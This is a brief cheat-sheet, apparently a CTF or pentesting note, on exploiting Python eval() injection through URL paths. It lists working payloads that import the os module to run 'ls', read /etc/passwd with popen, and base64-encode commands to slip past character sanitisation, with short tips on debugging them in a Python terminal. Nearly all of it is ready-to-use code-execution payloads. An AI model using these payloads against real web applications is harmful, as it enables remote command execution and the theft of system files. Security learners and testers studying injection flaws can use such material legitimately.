### Eval used?:
`/hello/"%2bos.popen('ls').read()%2b"`  

_what if there is no system module??_    We IMPORT it :D    **__import__('os').system('ls')**  
If you are grappling with erros, try t run your commands in a python terminal and see if it works
Example of the above 2 points:  
`hello/ddd"%2bstr(__import__('os').system('ls'))%2b"`  
`/ddd"%2bstr(__import__('os').popen('cat%20/etc/passwd').read())%2b"`

Above we can see that the os module has been imported as well as tthe command being evaluated as a string, as python was trying to eval as an int

__what if characters are sanitised?__  
**we can chain os and base64**  
`(__import__('os').popen(__import__('base64').b64decode('d2hvYW1p').decode('utf-8')).read())`
